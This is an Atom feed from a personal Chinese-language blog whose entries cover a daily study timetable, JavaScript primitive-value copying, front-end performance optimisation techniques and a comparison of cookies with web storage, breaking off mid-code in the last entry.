<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>吾辈之人，自当自强不息！</title>
  
  <subtitle>博客</subtitle>
  <link href="https://merlynr.github.io/atom.xml" rel="self"/>
  
  <link href="https://merlynr.github.io/"/>
  <updated>2022-09-12T16:00:00.000Z</updated>
  <id>https://merlynr.github.io/</id>
  
  <author>
    <name>Merlynr</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2022-9-13研究生的倒数第245天</title>
    <link href="https://merlynr.github.io/2022/09/13/2022-9-13%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC245%E5%A4%A9/"/>
    <id>https://merlynr.github.io/2022/09/13/2022-9-13%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC245%E5%A4%A9/</id>
    <published>2022-09-12T16:00:00.000Z</published>
    <updated>2022-09-12T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00 今日学习学习            <strong><font color="#D2691E">前端基础速通</font></strong></li><li><input disabled="" type="checkbox"> 10:00~10:20 上午学习总结        <strong><font color="#D2691E">算法</font></strong></li><li><input disabled="" type="checkbox"> 10:20~10:50 breaking news【一三五】   <strong><font color="#D2691E">js进阶</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20 刘畅【二四六】   <strong><font color="#D2691E">微信小程序</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">todo-2</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">todo-3</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">todo-4</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">todo-5</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">todo-6</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="graduate student time" scheme="https://merlynr.github.io/categories/graduate-student-time/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
    <category term="FE" scheme="https://merlynr.github.io/tags/FE/"/>
    
    <category term="algorithm" scheme="https://merlynr.github.io/tags/algorithm/"/>
    
    <category term="deep learning" scheme="https://merlynr.github.io/tags/deep-learning/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript中原始类型有趣的事</title>
    <link href="https://merlynr.github.io/2022/08/24/JavaScript%E4%B8%AD%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8B/"/>
    <id>https://merlynr.github.io/2022/08/24/JavaScript%E4%B8%AD%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8B/</id>
    <published>2022-08-23T16:00:00.000Z</published>
    <updated>2022-08-23T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="函数参数命名出现的问题"><a href="#函数参数命名出现的问题" class="headerlink" title="函数参数命名出现的问题"></a>函数参数命名出现的问题</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 基本类型</span><br><span class="line">let foo = 5;</span><br><span class="line"></span><br><span class="line">// 定义一个貌似可以改变基本类型值的函数</span><br><span class="line">function addTwo(num) &#123;</span><br><span class="line">    num += 2;</span><br><span class="line">&#125;</span><br><span class="line">// 和前面的函数一样</span><br><span class="line">function addTwo_v2(foo) &#123;</span><br><span class="line">    foo += 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 调用第一个函数，并传入基本类型值作为参数</span><br><span class="line">addTwo(foo);</span><br><span class="line">// Getting the current Primitive value</span><br><span class="line">console.log(foo);   // 5</span><br><span class="line"></span><br><span class="line">// 尝试调用第二个函数...</span><br><span class="line">addTwo_v2(foo);</span><br><span class="line">console.log(foo);   // 5</span><br></pre></td></tr></table></figure><p><strong>你是否认为会得到7，而不是5？如果是，请看看代码是如何运行的：</strong></p><ul><li>addTwo和addTwo_v2函数调用时，JavaScript 会检查标识符foo的值，从而准确无误的找到第一行实例化变量的声明语句。</li><li>找到以后，JavaScript 将其作为参数传递给函数的形参。</li><li>在执行函数体内语句之前，JavaScript 会将传递进来的参数（基本类型的值）复制一份，<font color="#FF00FF">创建一个本地副本。</font>这个副本只存在于该函数的作用域中，我们能够通过指定在函数中的标识符访问到它（addTwo中的num，addTwo_v2中的foo）。</li><li>接下来，函数体中的语句开始执行：<ul><li>第一个函数中，创建了本地num参数，num的值加 2，但这个值并不是原来的foo的值。</li><li>第二个函数中，创建了本地参数foo，并将它的值加 2，<font color="#FF00FF">这个值不是外部 foo 的值。在这种情况下，外部的foo变量不能以任何方式被访问到。这是因为 JavaScript 的词法作用域（lexical scoping）所导致的变量覆盖，本地的变量foo覆盖了外部的变量foo。</font>欲知详情，请参阅闭包。</li></ul></li><li>综上所述，函数中的任何操作都不会影响到最初的foo，我们操作的只不过是它的副本。</li></ul>]]></content>
    
    
    <summary type="html">每天学习</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>性能优化(第十五天)</title>
    <link href="https://merlynr.github.io/2022/08/10/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96(%E7%AC%AC%E5%8D%81%E4%BA%94%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/10/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96(%E7%AC%AC%E5%8D%81%E4%BA%94%E5%A4%A9)/</id>
    <published>2022-08-09T16:00:00.000Z</published>
    <updated>2022-08-09T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端性能优化手段"><a href="#前端性能优化手段" class="headerlink" title="前端性能优化手段"></a>前端性能优化手段</h1><p>前端性能优化手段从以下几个方面入手：<strong>加载优化、执行优化、渲染优化、样式优化、脚本优化</strong></p><p><strong>加载优化:</strong> 减少HTTP请求、缓存资源、压缩代码、无阻塞、首屏加载、按需加载、预加载、压缩图像、减少Cookie、避免重定向、异步加载第三方资源</p><p><strong>执行优化：</strong> CSS写在头部，JS写在尾部并异步、避免img、iframe等的src为空、尽量避免重置图像大小、图像尽量避免使用DataURL</p><p><strong>渲染优化：</strong> 设置viewport、减少DOM节点、优化动画、优化高频事件、GPU加速</p><p><strong>样式优化：</strong> 避免在HTML中书写style、避免CSS表达式、移除CSS空规则、正确使用display：display、不滥用float等</p><p><strong>脚本优化：</strong> 减少重绘和回流、缓存DOM选择与计算、缓存.length的值、尽量使用事件代理、尽量使用id选择器、touch事件优化</p><h2 id="加载优化"><a href="#加载优化" class="headerlink" title="加载优化"></a>加载优化</h2><ol><li>减少HTTP请求：尽量减少页面的请求数(首次加载同时请求数不能超过4个)，移动设备浏览器同时响应请求为4个请求(Android支持4个，iOS5+支持6个)<ul><li>合并CSS和JS</li><li>使用CSS精灵图</li></ul></li><li>缓存资源：使用缓存可减少向服务器的请求数，节省加载时间，所有静态资源都要在服务器端设置缓存，并且尽量使用长缓存(使用时间戳更新缓存)<ul><li>缓存一切可缓存的资源</li><li>使用长缓存</li><li>使用外联的样式和脚本</li></ul></li><li>压缩代码：减少资源大小可加快网页显示速度，对代码进行压缩，并在服务器端设置GZip<ul><li>压缩代码(多余的缩进、空格和换行符)</li><li>启用Gzip</li></ul></li><li>无阻塞：头部内联的样式和脚本会阻塞页面的渲染，样式放在头部并使用link方式引入，脚本放在尾部并使用<font color="#FF8C00">异步方式加载</font></li><li>首屏加载：首屏快速显示可大大提升用户对页面速度的感知，应尽量针对首屏的快速显示做优化</li><li>按需加载：将不影响首屏的资源和当前屏幕不用的资源放到用户需要时才加载，可大大提升显示速度和降低总体流量(按需加载会导致大量重绘，影响渲染性能)<ul><li>懒加载</li><li>滚屏加载</li><li>Media Query加载</li></ul></li><li>预加载：大型资源页面可使用Loading，资源加载完成后再显示页面，但加载时间过长，会造成用户流失</li></ol><ul><li>可感知Loading：进入页面时Loading</li><li>不可感知Loading：提前加载下一页</li></ul><ol start="8"><li>压缩图像：使用图像时选择最合适的格式和大小，然后使用工具压缩，同时在代码中用srcset来按需显示(过度压缩图像大小影响图像显示效果)<ul><li>使用TinyJpg和TinyPng压缩图像</li><li>使用CSS3、SVG、IconFont代替图像</li><li>使用img的srcset按需加载图像</li><li>选择合适的图像：webp优于jpg，png8优于gif</li><li>选择合适的大小：首次加载不大于1014kb、不宽于640px</li><li>PS切图时D端图像保存质量为80，M端图像保存质量为60</li></ul></li><li>减少Cookie：Cookie会影响加载速度，静态资源域名不使用Cookie</li><li>避免重定向：重定向会影响加载速度，在服务器正确设置避免重定向</li><li>异步加载第三方资源：第三方资源不可控会影响页面的加载和显示，要异步加载第三方资源</li></ol><h2 id="执行优化"><a href="#执行优化" class="headerlink" title="执行优化"></a>执行优化</h2><ul><li><strong>CSS写在头部，JS写在尾部并异步</strong></li><li><font color="#FF00FF">避免img、iframe等的src为空：空src会重新加载当前页面，影响速度和效率</font></li><li><font color="#FF00FF">尽量避免重置图像大小：多次重置图像大小会引发图像的多次重绘，影响性能</font></li><li><font color="#FF00FF">图像尽量避免使用DataURL</font>：DataURL图像没有使用图像的压缩算法，文件会变大，并且要解码后再渲染，加载慢耗时长</li></ul><h2 id="渲染优化"><a href="#渲染优化" class="headerlink" title="渲染优化"></a>渲染优化</h2><ul><li><strong>设置viewport：</strong> HTML的viewport可加速页面的渲染</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>减少DOM节点</strong>：DOM节点太多影响页面的渲染，尽量减少DOM节点</p></li><li><p><strong>优化动画</strong></p><ul><li>尽量使用CSS3动画</li><li>合理使用requestAnimationFrame动画代替setTimeout</li><li>适当使用Canvas动画：5个元素以内使用CSS动画，5个元素以上使用Canvas动画，iOS8+可使用WebGL动画</li></ul></li><li><p><strong>优化高频事件</strong>：scroll、touchmove等事件可导致多次渲染</p><ul><li>函数节流</li><li>函数防抖</li><li>使用requestAnimationFrame监听帧变化：使得在正确的时间进行渲染</li><li>增加响应变化的时间间隔：减少重绘次数</li></ul></li><li><p><strong>GPU加速</strong>：使用某些HTML5标签和CSS3属性会触发GPU渲染，请合理使用(过渡使用会引发手机耗电量增加)</p><ul><li>HTML标签：video、canvas、webgl</li><li>CSS属性：opacity、transform、transition</li></ul></li></ul><h2 id="样式优化"><a href="#样式优化" class="headerlink" title="样式优化"></a>样式优化</h2><ol><li>避免在HTML中书写style</li><li>避免CSS表达式：<font color="#FF00FF">CSS表达式的执行需跳出CSS树的渲染</font></li><li>移除CSS空规则：<font color="#FF00FF">CSS空规则增加了css文件的大小，影响CSS树的执行</font></li><li><font color="#FF00FF">正确使用display</font>：display会影响页面的渲染<ul><li>display:inline后不应该再使用float、margin、padding、width和height</li><li>display:inline-block后不应该再使用float</li><li>display:block后不应该再使用vertical-align</li><li>display:table-*后不应该再使用float和margin</li></ul></li><li>不滥用float：<font color="#FF8C00">float在渲染时计算量比较大，尽量减少使用</font></li><li>不滥用Web字体：Web字体需要下载、解析、重绘当前页面，尽量减少使用</li><li>不声明过多的font-size：过多的font-size影响CSS树的效率</li><li><font color="#FF00FF">值为0时不需要任何单位：为了浏览器的兼容性和性能，值为0时不要带单位</font></li><li>标准化各种浏览器前缀<ul><li>无前缀属性应放在最后</li><li>CSS动画属性<font color="#FF00FF">只用-webkit-、无前缀两种</font></li><li>其它前缀为-webkit-、-moz-、-ms-、无前缀四种：Opera改用blink内核，-o-已淘汰</li></ul></li><li>避免让选择符看起来像正则表达式：<font color="#FF00FF">高级选择符执行耗时长且不易读懂，避免使用</font></li></ol><h2 id="脚本优化-【TODO】"><a href="#脚本优化-【TODO】" class="headerlink" title="脚本优化 【TODO】"></a>脚本优化 【TODO】</h2><ol><li>减少重绘和回流<ul><li>避免不必要的DOM操作</li><li>避免使用document.write</li><li>减少drawImage</li><li>尽量改变class而不是style，使用classList代替className</li></ul></li><li>缓存DOM选择与计算：每次DOM选择都要计算和缓存</li><li>缓存.length的值：每次.length计算用一个变量保存值</li><li>尽量使用事件代理：避免批量绑定事件</li><li>尽量使用id选择器：<font color="#FF00FF">id选择器选择元素是最快</font>的</li><li>touch事件优化：使用tap(touchstart和touchend)代替click(注意touch响应过快，易引发误操作)</li></ol><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><h3 id="雅虎"><a href="#雅虎" class="headerlink" title="雅虎"></a>雅虎</h3><p><img src="http://files.shanqianche.cn/20228/1660119419712.png" alt="雅虎军规"></p><p><img src="http://files.shanqianche.cn/20228/1660119467606.png" alt="雅虎军规"><br><img src="http://files.shanqianche.cn/20228/1660119493503.png" alt="雅虎军规"></p><h3 id="2-5-8原则"><a href="#2-5-8原则" class="headerlink" title="2-5-8原则"></a>2-5-8原则</h3><p>在前端开发中，此规则作为一种开发指导思路，针对浏览器页面的性能优化。</p><p>用户在2秒内得到响应，会感觉页面的响应速度很快 Fast<br>用户在2<del>5秒间得到响应，会感觉页面的响应速度还行 Medium<br>用户在5</del>8秒间得到响应，会感觉页面的响应速度很慢，但还可以接受 Slow<br>用户在8秒后仍然无法得到响应，会感觉页面的响应速度垃圾死了</p><h1 id="一个官网怎么优化，有哪些性能指标，如何量化"><a href="#一个官网怎么优化，有哪些性能指标，如何量化" class="headerlink" title="一个官网怎么优化，有哪些性能指标，如何量化"></a>一个官网怎么优化，有哪些性能指标，如何量化</h1><blockquote><p><font color="#FF8C00">对首屏加载速度影响最大的还是资源大小，请求数量，请求速度等。代码方面，前端一般很难写出严重影响速度的代码。减小资源大小，可以用各种压缩，懒加载，预加载，异步加载等方法。</font>减少请求数量可以使用雪碧图，搭建node中台将多个请求合并成一个等。<font color="#FF8C00">对于官网这种项目，最好使用服务端渲染</font>，<font color="#FF00FF">首屏快之外，也有利于SEO。</font></p></blockquote><h2 id="检测方案："><a href="#检测方案：" class="headerlink" title="检测方案："></a>检测方案：</h2><p>使用lighthouse进行性能检测，并对lighthouse提出的建议进行优化</p><h2 id="具体优化方案："><a href="#具体优化方案：" class="headerlink" title="具体优化方案："></a>具体优化方案：</h2><p>通过静态化、图片懒加载、图片压缩、异步加载（js和css）、优化代码等方式，以下是具体方法</p><h2 id="静态化"><a href="#静态化" class="headerlink" title="静态化"></a>静态化</h2><p><strong>服务端渲染，“直出”页面，具有较好的SEO和首屏加载速度。主要还有以下的优点：</strong></p><ul><li>使用jsp模板语法（百度后发现是用Velocity模板语法）渲染页面，减少了js文件体积</li><li>减少了请求数量</li><li>因为不用等待大量接口返回，加快了首屏时间</li></ul><p><strong>可以尝试Vue的服务端渲染。首页目前有部分是用接口读取数据，然后用jq进行渲染，性能上应该不如Virtual DOM，不过内容不多。</strong></p><h2 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h2><p><font color="#FF8C00">这是一个很重要的优化项。</font>因为官网上有很多图片，而且编辑们上传文章图片的时候一般没有压缩，但是很多图片的体积都很大。还有一个轮播图，20张图标，最小的几十K，最大的两百多K。对于图片来源不可控的页面，懒加载是个很实用的操作，直接将首屏加载的资源大小减少了十几M。</p><h2 id="图片压缩"><a href="#图片压缩" class="headerlink" title="图片压缩"></a>图片压缩</h2><p>对于来源可控，小图标等图片可以用雪碧图，base64等方法进行优化。目前只是用工具压缩了图片大小，后续可以考虑在webpack打包的时候生成雪碧图。</p><h2 id="异步加载js"><a href="#异步加载js" class="headerlink" title="异步加载js"></a>异步加载js</h2><p><font color="#FF8C00">通过标签引入的js文件，可以设置defer，async属性让其异步加载，而不会阻塞渲染。defer和async的区别在于async加载完就立即执行，没有考虑依赖，标签顺序等。而defer加载完后会等它前面引入的文件执行完再执行。<font color="#FF8C00">一般defer用的比较多，async只能用在那些跟别的文件没有联系的孤儿脚本上</font>。</font></p><h2 id="异步加载css"><a href="#异步加载css" class="headerlink" title="异步加载css"></a>异步加载css</h2><p>没想到css也能异步加载，但这是lighthouse给出的建议。找了一下发现有以下两种方法：<br>一是通过js脚本在文档中插入标签<br>二是通过<code>&#39;&#39;</code>的media属性<br><font color="#FF8C00">media属性是媒体查询用的，用于在不同情况下加载不同的css。这里是将其设置为一个不适配当前浏览器环境的值，甚至是不能识别的值，浏览器会认为这个样式文件优先级低，会在不阻塞的情况加载。加载完成后再将media`设置为正常值，让浏览器解析css。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;//example.css&quot; media=&quot;none&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">这里用的是第二种方法。但是webpack注入到html中的外链css还没找到异步加载的方法。</font></p><h2 id="preconnent"><a href="#preconnent" class="headerlink" title="preconnent"></a>preconnent</h2><p>lighthouse建议对于接下来会访问的地址可以<font color="#FF8C00">提前建立连接</font>。一般有一下几种方式。</p><ol><li>dns-prefetch域名预解析</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//example.com&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>preconnet预连接</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;preconnect&quot; href=&quot;//example.com&quot;&gt;</span><br><span class="line">&lt;link rel=&quot;preconnect&quot; href=&quot;//cdn.example.com&quot; crossorigin&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>prefetch预加载</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//example.com/next-page.html&quot; as=&quot;html&quot; crossorigin=&quot;use-credentials&quot;&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;library.js&quot; as=&quot;script&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>prerender预渲染</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prerender&quot; href=&quot;//example.com/next-page.html&quot;&gt;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">这四种层层递进，但是不要连接不需要的资源，反而损耗性能</font>。我在页面上对某些资源用了preconnect，但并没有明显的效果。应该对于在线小说，在线漫画这种场景预加载会更适用。</p><h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><p><font color="#FF8C00">lighthouse上显示主线程耗时最多的是样式和布局，所以对这部分进行优化</font>。主要有一下几点：</p><ul><li>去掉页面上用于布局的table，table本身性能较低，且维护性差，是一种过时的布局方案。</li><li>在去掉table布局的同时减少一些无意义的DOM元素，减少DOM元素的数量和嵌套。</li><li>减少css选择器的嵌套。用sass，less这种css预处理器很容易造成多层嵌套。优化前代码里最多的有七八层嵌套，对性能有一定影响。重构后不超过三层。</li></ul><p><strong>通过上面的重构后，样式布局和渲染时间从lighthouse上看大概减少了300ms。但样式和布局的时间还是最长的，感觉还有优化空间。</strong></p><h3 id="结构优化"><a href="#结构优化" class="headerlink" title="结构优化"></a>结构优化</h3><p>接下来是js代码的优化和重构。因为移除Vue框架，以及用服务端端直出，现在js代码已经减少了大部分。主要有以下几部分：</p><ul><li><font color="#FF8C00">拆分函数，将功能复杂的函数拆分成小函数，让每个函数只做一件事。</font></li><li><font color="#FF8C00">优化分支结构，用对象Object，代替if…else和switch…case</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 优化前</span><br><span class="line">var getState = function (state) &#123;</span><br><span class="line">  switch (state) &#123;</span><br><span class="line">    case 1:</span><br><span class="line">      return &#x27;up&#x27;;</span><br><span class="line">    case 0:</span><br><span class="line">      return &#x27;stay&#x27;;</span><br><span class="line">    case 2:</span><br><span class="line">      return &#x27;down&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 优化后</span><br><span class="line">var getState = function(state) &#123;</span><br><span class="line">  var stateMap = &#123;</span><br><span class="line">    1: &#x27;up&#x27;, 0: &#x27;stay&#x27;, 2: &#x27;down&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  return stateMap[state]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化DOM操作"><a href="#优化DOM操作" class="headerlink" title="优化DOM操作"></a>优化DOM操作</h3><p>DOM操作如改变样式，改变内容可能会引起页面的重绘重排，是比较消耗性能的。网上也有很多优化jq操作的方法。<br>如<font color="#FF8C00">将查询到的DOM使用变量存起来，避免重复查询。以及将多次DOM操作变成一次等。</font>这里重点讲一下第二种。</p><ul><li>常见的需求是渲染一个列表，如果直接在for循环里面append到父元素中，性能是非常差的。幸好原来的操作是将所有DOM用字符串拼接起来，再用html()方法一次性添加到页面中。</li><li>还有另一种方法是使用文档碎片(fragment)。<font color="#FF8C00">通过document.createDocumentFragment()可以新建一个fragment。向fragment中appendChild元素的时候是不会阻塞渲染进程的</font>。最后将fragment替换掉页面上的元素。将fragment元素用appendChild的方法添加到页面上时，实际上添加上去的是它内部的元素，也就是它的子元素。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var fragment = document.createDocumentFragment()</span><br><span class="line">for (var i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">  var str = &#x27;&lt;div&gt;&#x27; + i + &#x27;&lt;/div&gt;&#x27;</span><br><span class="line">  fragment.appendChild($(str)[0])</span><br><span class="line">&#125;</span><br><span class="line">$(&#x27;.container&#x27;).append(fragment)</span><br></pre></td></tr></table></figure><p><font color="#FF00FF">经过测试，在当前的场景下，使用fragment的速度和html()是差不多的，都是10ms左右。区别在于最后将fragment添加到页面上$(‘.container’).append(fragment)这行代码仅仅花费1ms。也就是说，将fragment插入页面时不会引起页面重绘重排，不会引起阻塞。</font></p><h1 id="尾调用优化"><a href="#尾调用优化" class="headerlink" title="尾调用优化"></a>尾调用优化</h1><p><strong>尾调用是指某个函数的最后一步是调用另一个函数。</strong></p><p>函数调用会在内存形成一个“<font color="#FF8C00">调用记录”，又称“调用帧”</font>，保存调用位置和内存变量等信息。如果在函数A的内部调用函数B，那么在A的调用帧上方，还会形成一个B的调用帧。等到B运行结束，将结果返回到A，B的调用帧才会消失。如果函数B内部还调用函数C，那就还有一个C的调用帧，依次类推。所有的调用帧，就形成一个“<font color="#FF8C00">调用栈</font>”。</p><p><strong>尾调用由于是函数的最后一步操作，所有不需要保留外层函数的调用帧，因为调用位置、内部变量等信息都不会再用到了，只要直接用内层函数的调用帧，取代外层函数的调用帧就可以了。</strong></p><p>如果所有函数都是尾调用，那么完全可以做到每次执行时，调用帧只有一项，这将大大节省内存。这就是“尾调用优化”。注意，<font color="#FF8C00">只有不再用到外层函数的内部变量，内层函数的调用帧才会取代外层函数的调用帧，否则就无法进行“尾调用优化”。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function addOne(a) &#123;</span><br><span class="line">    var one = 1;</span><br><span class="line">    function inner(b) &#123;</span><br><span class="line">        return b + one;</span><br><span class="line">    &#125;</span><br><span class="line">    return inner(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>浏览器相关内容(第十四天)</title>
    <link href="https://merlynr.github.io/2022/08/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9(%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9(%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%A4%A9)/</id>
    <published>2022-08-09T16:00:00.000Z</published>
    <updated>2022-08-09T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cookie-sessionStorage-localStorage-区别"><a href="#cookie-sessionStorage-localStorage-区别" class="headerlink" title="cookie sessionStorage localStorage 区别"></a>cookie sessionStorage localStorage 区别</h1><p><strong>共同点：</strong> 都是保存在浏览器端、且同源的</p><p><strong>区别：</strong></p><ol><li><p>cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递，而sessionStorage和localStorage不会自动把数据发送给服务器，仅在本地保存。cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下</p></li><li><p>存储大小限制也不同，cookie数据不能超过4K，同时因为每次http请求都会携带cookie、所以cookie只适合保存很小的数据，如会话标识。sessionStorage和localStorage虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大</p></li><li><p>数据有效期不同，sessionStorage：仅在当前浏览器窗口关闭之前有效；localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie：只在设置的cookie过期时间之前有效，即使窗口关闭或浏览器关闭</p></li><li><p>作用域不同，sessionStorage不在不同的浏览器窗口中共享，即使是同一个页面；localstorage在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的</p></li><li><p>web Storage支持事件通知机制，可以将数据更新的通知发送给监听者</p></li><li><p>web Storage的api接口使用更方便</p></li></ol><h1 id="如何写一个会过期的localStorage，说说想法"><a href="#如何写一个会过期的localStorage，说说想法" class="headerlink" title="如何写一个会过期的localStorage，说说想法"></a>如何写一个会过期的localStorage，说说想法</h1><p><strong>两种方案：惰性删除 和 定时删除</strong></p><h2 id="惰性删除"><a href="#惰性删除" class="headerlink" title="惰性删除"></a>惰性删除</h2><blockquote><p>惰性删除是指，某个键值过期后，该键值不会被马上删除，而是等到下次被使用的时候，才会被检查到过期，此时才能得到删除。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td 